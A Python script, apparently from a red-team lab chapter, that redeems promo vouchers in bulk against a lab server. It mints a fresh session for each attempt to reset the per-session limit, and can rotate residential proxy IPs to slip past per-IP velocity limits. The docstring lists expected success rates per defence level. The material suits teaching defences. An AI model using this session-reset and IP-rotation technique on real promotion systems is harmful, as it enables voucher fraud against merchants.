"""
Chapter 8, Round 2 attack: a fresh session for every voucher.

Round 1 tied the unlock to the server session, so one unlock buys one voucher. The answer is
to mint a new session each time: drop the cookie jar, unlock again, redeem again. A per-session
limit resets for free when the session does.

From one address this trips session-creation velocity. The red step rotates addresses.

  --rotate   mint each session from a different residential IP. One new session per address
             looks like a new customer, so the per-IP velocity limit never fires.

Expected:
  level 1   30/30 (velocity not wired yet)
  level 2   ~10/30: the first ~10 new sessions a minute get through, the rest are rate-limited
  level 2 --rotate   30/30: a clean new address for every session

    python attacks/round2_session_reset.py
"""

import argparse
import os
import sys
from collections import Counter

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import promokit as pk  # noqa: E402
from labclient import world_pool  # noqa: E402

ATTEMPTS = 30


def run(rotate=False):
    pool = world_pool("residential_proxy_net") if rotate else None
    fixed = None if rotate else world_pool("cloud_vm")[0]      # one datacenter address for the whole run
    name = "r2_reset_rotate" if rotate else "r2_reset"
    sig, succeeded = Counter(), 0
    for i in range(ATTEMPTS):
        ip = pool[i % len(pool)] if pool else fixed
        c = pk.new_client(f"bot:{name}", ip=ip)                # new cookie jar: a brand-new session
        r = c.get("/", pk.browser_headers("typed"))            # creating the session: velocity judges here
        if r.status_code != 200:                               # rate-limited at birth: abandon this session
            pk.tally(c, sig)
            continue
        c.get("/promo/", pk.browser_headers("link", pk.BASE_URL + "/"))
        pk.unlock(c)
        r = pk.redeem(c)
        if r.status_code == 200 and "voucher" in r.text:
            succeeded += 1
        pk.tally(c, sig)
    return pk.report(name, ATTEMPTS, succeeded, signals=sig)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--rotate", action="store_true", help="mint each session from a fresh residential IP")
    run(**vars(ap.parse_args()))
